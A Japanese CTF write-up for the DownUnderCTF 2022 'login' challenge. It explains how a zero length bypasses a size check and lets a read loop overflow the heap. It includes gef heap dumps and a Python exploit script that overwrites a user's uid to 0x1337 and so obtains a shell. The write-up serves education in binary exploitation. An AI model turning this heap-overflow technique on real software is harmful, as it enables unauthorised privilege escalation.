# login - DownUnderCTF2022

この問題はuidが0x1337であるユーザーにシェルが与えられるので、
0x1337を持つユーザーを作成することが目的。

## 解法
`length`が0のとき、以下の制約を回避しながら
```c
if(len > USERNAME_LEN) {
    puts("Length too large!");
    exit(1);
}
```

`read_n_delimited`関数のwhileの条件が`i <= -1`になるので、
たくさん読み込むことができます。
```c
while(i <= n - 1) {
    if(read(0, &c, 1) != 1) {
        break;
    }
```

`top chunk`のアドレスを確認したあと、
その周辺の様子を確認すると、以下のようになっているので、
HeapOverflowで`uid`に相当する場所を書き換えます。

```
gef> heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE)
    [0x0000555555559010    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................]
Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE)
    [0x00005555555592a0    38 13 00 00 41 41 41 41 00 00 00 00 00 00 00 00   8...AAAA........]
Chunk(addr=0x5555555592c0, size=0x20d50, flags=PREV_INUSE)  <-  top chunk
```

```
gef> x/10xg 0x5555555592c0-0x40
0x555555559280: 0x0000000000000000      0x0000000000000000
0x555555559290: 0x0000000000000000      0x0000000000000021
0x5555555592a0: 0x4141414100001338      0x0000000000000000
0x5555555592b0: 0x0000000000000000      0x0000000000020d51
0x5555555592c0: 0x0000000000000000      0x0000000000000000
```

top chunkの値(0x20d51)を壊さないようなpayloadを作成します。
```python
def add_user(length: bytes, name: bytes):
    io.sendlineafter("> ", "1")
    io.sendlineafter("length: ", length)
    io.sendlineafter("Username: ", name)

def login(name: bytes):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Username: ", name)

add_user(b"0", b"AAAA" + p64(0)*2 +p64(0x20d50) + p64(0x1337))
add_user(b"7", b"yu1hpa")
login(b"yu1hpa")
```

そうすると、以下のように成功します。
```
gef> x/16xg 0x5555555592c0-0x40
0x555555559280: 0x0000000000000000      0x0000000000000000
0x555555559290: 0x0000000000000000      0x0000000000000021
0x5555555592a0: 0x4141414100001338      0x0000000000000000
0x5555555592b0: 0x0000000000000000      0x0000000000000021
0x5555555592c0: 0x6831757900001337      0x0000000000006170
0x5555555592d0: 0x0000000000000000      0x0000000000020d31
0x5555555592e0: 0x0000000000000000      0x0000000000000000
0x5555555592f0: 0x0000000000000000      0x0000000000000000
```


